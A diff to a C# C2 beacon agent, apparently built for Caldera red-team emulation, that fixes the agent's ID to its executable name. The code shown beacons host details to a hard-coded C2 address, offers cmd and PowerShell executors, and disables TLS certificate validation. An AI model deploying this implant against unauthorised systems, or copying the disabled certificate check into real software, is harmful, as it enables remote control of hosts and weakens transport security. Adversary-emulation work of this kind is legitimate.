@@ -10,7 +10,7 @@ class Agent
 {
     static string server = "https://192.168.124.133";
     static string group = "red";
-    static string paw = null;
+    static string paw = null;  // Will be set to exe name without extension
     static string platform = "windows";
     static string executors = "cmd,psh,pwsh";
     static int sleep = 5;
@@ -50,6 +50,10 @@ class Agent
             }
         }
 
+        // PAW = exe name without extension (simple and immutable)
+        paw = Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName);
+        Log("PAW set to exe name: " + paw);
+        
         Log("Agent starting with server=" + server);
         ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
         ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
@@ -79,8 +83,7 @@ class Agent
     {
         var proc = Process.GetCurrentProcess();
         
-        // ALWAYS send full profile - more robust for C2 restarts
-        // Caldera will use PAW if provided, otherwise assign new one
+        // PAW = exe name without extension (always sent, never changes)
         var json = "{" +
             $"\"platform\":\"windows\"," +
             $"\"server\":\"{server}\"," +
@@ -95,17 +98,10 @@ class Agent
             $"\"pid\":\"{proc.Id}\"," +
             $"\"ppid\":\"0\"," +
             $"\"exe_name\":\"{Path.GetFileName(proc.MainModule.FileName)}\"," +
-            $"\"paw\":{(paw == null ? "null" : "\"" + paw + "\"")}" +
+            $"\"paw\":\"{paw}\"" +
             "}";
         
-        if (paw == null)
-        {
-            Log("[BEACON] First beacon - full profile");
-        }
-        else
-        {
-            Log("[BEACON] Beacon with PAW: " + paw + " (full profile)");
-        }
+        Log("[BEACON] Beacon with PAW: " + paw);
         Log("JSON: " + json);
         byte[] data = Encoding.UTF8.GetBytes(json);
         
@@ -125,20 +121,10 @@ class Agent
                 Log($"[BEACON] Field: {kvp.Key} = {valuePreview}");
             }
             
-            // Save PAW if not set
-            if (paw == null && beacon.ContainsKey("paw"))
+            // PAW is fixed (exe name) - just confirm server acknowledged it
+            if (beacon.ContainsKey("paw"))
             {
-                paw = beacon["paw"];
-                Log("[BEACON] *** NEW PAW ASSIGNED: " + paw + " ***");
-            }
-            else if (beacon.ContainsKey("paw") && beacon["paw"] != paw)
-            {
-                Log("[BEACON] !!! WARNING: PAW CHANGED from " + paw + " to " + beacon["paw"] + " !!!");
-                paw = beacon["paw"];
-            }
-            else if (paw != null)
-            {
-                Log("[BEACON] PAW confirmed: " + paw);
+                Log("[BEACON] Server confirmed PAW: " + beacon["paw"]);
             }
             
             // Update sleep if provided
